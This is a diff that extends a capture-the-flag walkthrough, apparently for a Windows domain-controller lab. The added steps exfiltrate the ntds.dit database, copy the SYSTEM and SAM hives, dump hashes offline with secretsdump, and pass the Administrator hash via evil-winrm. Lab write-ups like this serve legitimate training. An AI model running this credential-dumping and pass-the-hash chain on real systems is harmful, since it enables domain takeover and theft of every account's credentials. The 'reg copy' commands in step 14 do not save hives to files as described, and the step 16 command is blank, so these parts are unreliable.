@@ -89,8 +89,25 @@
 
 <img width="910" height="368" alt="image" src="https://github.com/user-attachments/assets/72c1af2c-9fb8-42c6-812d-f22fbccfd82c" />
 
-13. Transfer ntds.dit file onto local machine
+13. Transfer ntds.dit file onto local machine.
 
 `download ntds.dit`
 
-14. 
+14. Also get a copy of the SYSTEM and SAM files and transfer onto local machine with the download command
+
+`reg copy hklm\system C:\Users\svc_backup\Desktop\system.save`
+
+`reg copy hklm\sam C:\Users\svc_backup\Desktop\sam.save`
+
+15. Run secretsdump on the system, sam and ntds.dit files to extract hashes offline
+
+`secretsdump.py -ntds ntds.dit -system system.save -sam sam.save LOCAL`
+
+<img width="886" height="393" alt="image" src="https://github.com/user-attachments/assets/3e5e6e0d-052b-4dfb-ad11-e45cb4203f2f" />
+
+16. Passing the Hash for the administrator allows us to evil-winrm into the machine as Administrator and get the root flag!
+
+``
+
+<img width="527" height="246" alt="image" src="https://github.com/user-attachments/assets/2bbdc903-5cab-45c2-8003-aeca8e1a6eab" />
+
